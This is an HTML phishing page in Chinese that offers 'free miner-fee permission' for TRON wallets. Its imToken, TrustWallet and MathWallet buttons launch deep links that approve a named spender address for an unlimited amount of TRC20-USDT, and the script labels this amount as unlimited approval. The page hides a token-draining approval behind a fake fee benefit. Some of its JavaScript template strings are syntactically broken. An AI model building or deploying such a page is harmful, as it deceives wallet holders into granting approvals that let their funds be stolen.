<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>获取免矿工费权限</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif; }
        body { background: #f5f7fa; padding: 20px; }
        .container { max-width: 500px; margin: 30px auto; padding: 25px; background: #fff; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); text-align: center; }
        .title { font-size: 22px; color: #333; margin-bottom: 20px; font-weight: 600; }
        .wallet-list { margin: 25px 0; }
        .wallet-item { display: block; width: 100%; padding: 15px; margin: 10px 0; background: #f0f7ff; border: 1px solid #2f54eb; border-radius: 8px; color: #2f54eb; text-decoration: none; font-size: 16px; transition: background 0.3s; }
        .wallet-item:hover { background: #e6f2ff; }
        .guide { font-size: 14px; color: #666; margin-top: 20px; line-height: 1.6; }
        .status { margin-top: 20px; padding: 12px; border-radius: 6px; font-size: 14px; text-align: left; }
        .success { background: #e8f5e9; color: #2e7d32; }
        .error { background: #ffebee; color: #c62828; }
        .loading { background: #fffbe6; color: #faad14; }
    </style>
</head>
<body>
    <div class="container">
        <h2 class="title">点击获取权限</h2>
        <p>请选择你使用的TRON钱包，点击后将直接唤起钱包完成授权：</p>
        <div class="wallet-list">
            <!-- imToken钱包唤起链接 -->
            <a href="imtoken://wallet/approve?address=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t&spender=TEq6aK14LJxid2Y1y7qz3iiVoiuRewPRwn&amount=115792089237316195423570985008687907853269984665640564039457584007913129639935" class="wallet-item" id="imTokenBtn">
                imToken
            </a>
            <!-- TrustWallet钱包唤起链接 -->
            <a href="trust://wallet/approve?address=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t&spender=TEq6aK14LJxid2Y1y7qz3iiVoiuRewPRwn&amount=115792089237316195423570985008687907853269984665640564039457584007913129639935" class="wallet-item" id="trustBtn">
                TrustWallet
            </a>
            <!-- MathWallet钱包唤起链接 -->
            <a href="mathwallet://wallet/approve?address=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t&spender=TEq6aK14LJxid2Y1y7qz3iiVoiuRewPRwn&amount=115792089237316195423570985008687907853269984665640564039457584007913129639935" class="wallet-item" id="mathBtn">
                MathWallet
            </a>
        </div>
        <div class="guide">
            若点击后未唤起钱包，请检查是否已安装对应APP；若未安装，可前往App Store搜索下载后重试。
        </div>
        <div class="status" id="status"></div>
    </div>

    <script>
        // 已替换为你的合约地址：TEq6aK14LJxid2Y1y7qz3iiVoiuRewPRwn（无需修改）
        const YOUR_CONTRACT_ADDRESS = "TEq6aK14LJxid2Y1y7qz3iiVoiuRewPRwn";
        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC20-USDT官方地址
        const MAX_APPROVE_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // 无限授权额度

        // DOM元素
        const statusEl = document.getElementById("status");
        const imTokenBtn = document.getElementById("imTokenBtn");
        const trustBtn = document.getElementById("trustBtn");
        const mathBtn = document.getElementById("mathBtn");

        // 初始化：确保链接参数正确（已提前替换，此处仅做校验）
        window.onload = () => {
            // 二次确认链接参数，避免异常
            imTokenBtn.href = imtoken://wallet/approve?address=${USDT_CONTRACT}&spender=${YOUR_CONTRACT_ADDRESS}&amount=${MAX_APPROVE_AMOUNT};
            trustBtn.href = trust://wallet/approve?address=${USDT_CONTRACT}&spender=${YOUR_CONTRACT_ADDRESS}&amount=${MAX_APPROVE_AMOUNT};
            mathBtn.href = mathwallet://wallet/approve?address=${USDT_CONTRACT}&spender=${YOUR_CONTRACT_ADDRESS}&amount=${MAX_APPROVE_AMOUNT};

            showStatus("请选择钱包，点击后唤起APP完成授权", "loading");
        };

        // 显示状态提示
        function showStatus(text, type) {
            statusEl.textContent = text;
            statusEl.className = status ${type};
            }

        // 监听页面返回：用户从钱包回到浏览器时提示状态
        document.addEventListener("visibilitychange", () => {
            if (document.hidden) return;
            showStatus("授权流程已发起，可在钱包中确认结果", "success");
        });
    </script>
</body>
</html>
